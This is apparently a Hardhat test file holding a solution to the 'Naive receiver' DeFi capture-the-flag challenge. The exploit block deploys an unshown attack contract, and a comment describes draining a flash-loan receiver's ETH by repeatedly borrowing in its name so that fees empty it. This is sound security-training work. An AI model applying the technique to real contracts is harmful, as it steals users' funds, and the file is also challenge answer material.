import { ethers } from "hardhat";
import { expect } from "chai";




describe('[Challenge] Naive receiver', function () {
    this.timeout(0);
    
    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');
    
    before(async function () {
        /** SETUP SCENARIO */
        
        const accounts = await ethers.getSigners();
        const [deployer, attacker, user, ...otherAccounts] = accounts;

        const lenderFactory = await ethers.getContractFactory("NaiveReceiverLenderPool");
        this.pool = await lenderFactory.connect(deployer).deploy();
        await deployer.sendTransaction({ from: deployer.address, to: this.pool.address, value: ETHER_IN_POOL })

        expect(
            await deployer.provider!.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL);

        expect(
            await this.pool.fixedFee()
        ).to.be.eq(ethers.utils.parseEther('1'));

        const receiverFactory = await ethers.getContractFactory("FlashLoanReceiver");
        this.receiver = await receiverFactory.connect(user).deploy(this.pool.address);
        await user.sendTransaction({ from: user.address, to: this.receiver.address, value: ETHER_IN_RECEIVER });

        expect(
            await user.provider!.getBalance(this.receiver.address)
        ).to.be.eq(ETHER_IN_RECEIVER);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        const accounts = await ethers.getSigners();
        const attacker = accounts[1];

        /*
         * We can call flashLoan method of the pool contract with victim.address as 
         * borrower parameter. We can do it till the victim's funds are drained. 
         * I did it in a proxy contract to make things happen in a single transaction 
         * as suggested in the challenge. 
         */
        const expFactory = await ethers.getContractFactory("NaiveReceiverExp");
        const expContract = await expFactory.connect(attacker).deploy(this.pool.address, this.receiver.address);

        let tx = await expContract.attack();
        await tx.wait();
        console.log(tx);
    });

    after(async function () {
        const accounts = await ethers.getSigners();
        const user = accounts[2];
        /** SUCCESS CONDITION */

        expect(
            await user.provider!.getBalance(this.receiver.address)
        ).to.be.eq(0);

        expect(
            await user.provider!.getBalance(this.pool.address)
        ).to.eq(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
